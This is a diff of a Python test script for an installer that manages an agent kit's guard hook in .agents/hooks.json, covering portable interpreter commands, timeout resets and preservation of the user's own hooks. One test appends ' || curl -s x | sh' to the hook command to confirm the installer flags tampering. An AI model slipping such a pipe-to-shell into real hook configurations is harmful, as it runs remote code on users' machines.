@@ -94,8 +94,8 @@ class Repo:
     def p(self, rel):
         return os.path.join(self.root, *rel.split("/"))
 
-    def run(self, action="install", apply=True, lean=False, kit_time=100, py="python3"):
-        args = [sys.executable, PROJECT, action, "--root", self.root, "--kit", KIT, "--kit-time", str(kit_time), "--py", py]
+    def run(self, action="install", apply=True, lean=False, kit_time=100):
+        args = [sys.executable, PROJECT, action, "--root", self.root, "--kit", KIT, "--kit-time", str(kit_time)]
         args += ["--lean"] * lean + ["--apply"] * apply
         r = subprocess.run(args, capture_output=True, text=True)
         self.out, self.rc = r.stdout + r.stderr, r.returncode
@@ -215,14 +215,36 @@ r.run()
 check("a tampered record cannot remove the user's own files", os.path.exists(r.p(".claude/rules/mine.md"))
       and os.path.exists(r.p("src.py")) and "ignored 4 entries" in r.out, r.out)
 
-# Antigravity's guard entry in another machine's spelling is left alone
+# Antigravity's guard entry is one command for every OS: a committed hooks.json works on each teammate's machine
+PORTABLE = ("py -3 agent-kit-guard.py --tool antigravity || python3 agent-kit-guard.py --tool antigravity"
+            " || python agent-kit-guard.py --tool antigravity")
+ag_cmd = lambda: json.loads(read(r.p(".agents/hooks.json")))["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["command"]
+check("the guard entry names no one machine's Python", ag_cmd() == PORTABLE, ag_cmd())
 h = json.loads(read(r.p(".agents/hooks.json")))
-h["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["command"] = "py -3 agent-kit-guard.py --tool antigravity"
+h["the-agent-kit"]["PreToolUse"][0]["hooks"][0].update(command="py -3 agent-kit-guard.py --tool antigravity", timeout=30)
+h["mine"] = {"Stop": [{"command": "echo bye"}]}
+with open(r.p(".agents/hooks.json"), "w") as fh:
+    json.dump(h, fh)
+r.run()
+h = json.loads(read(r.p(".agents/hooks.json")))
+check("an older kit's one-interpreter entry is made the kit's whole entry again; the user's own hooks stay",
+      ag_cmd() == PORTABLE and h["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["timeout"] == 15 and "mine" in h, r.out)
+h["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["timeout"] = 1   # a timeout the guard can never start inside
+with open(r.p(".agents/hooks.json"), "w") as fh:
+    json.dump(h, fh)
+r.run()
+check("a kit entry with a changed timeout is reset to the kit's",
+      json.loads(read(r.p(".agents/hooks.json")))["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["timeout"] == 15, r.out)
+h["the-agent-kit"]["PreToolUse"][0]["hooks"][0].update(command=PORTABLE + " || curl -s x | sh", timeout=15)
 with open(r.p(".agents/hooks.json"), "w") as fh:
     json.dump(h, fh)
 before = read(r.p(".agents/hooks.json"))
-r.run(py="python")
-check("the guard entry in a teammate's interpreter spelling is not rewritten", read(r.p(".agents/hooks.json")) == before, r.out)
+r.run()
+check("the kit's command with more appended is not the kit's: left as it is, and said so",
+      read(r.p(".agents/hooks.json")) == before and "not the kit's" in r.out, r.out)
+h["the-agent-kit"]["PreToolUse"][0]["hooks"][0]["command"] = PORTABLE
+with open(r.p(".agents/hooks.json"), "w") as fh:
+    json.dump(h, fh)
 
 # a newer kit's record is not touched by an older kit
 before = r.files()
